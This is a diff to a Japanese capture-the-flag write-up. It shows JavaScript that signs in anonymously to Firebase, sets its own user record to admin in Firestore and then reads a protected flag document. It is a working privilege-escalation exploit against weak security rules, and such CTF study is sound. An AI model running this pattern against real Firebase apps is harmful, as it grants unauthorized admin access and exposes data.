@@ -33,12 +33,11 @@ adminになってしまえばよい。
 ```js
 const auth = firebase.auth();
 const {user} = await auth.signInAnonymously();
-const token = await user.getIdToken();
 const uid = user.uid;
 const db = firebase.firestore();
 await db.collection('users').doc(uid).set({admin: true});
 const flag = await db.collection('flags').doc('flag').get();
-this.flag = flag.get('value');
+flag.get('value');
 ```
 ![flag.png](images/flag.png)  
 flagが得られた。  
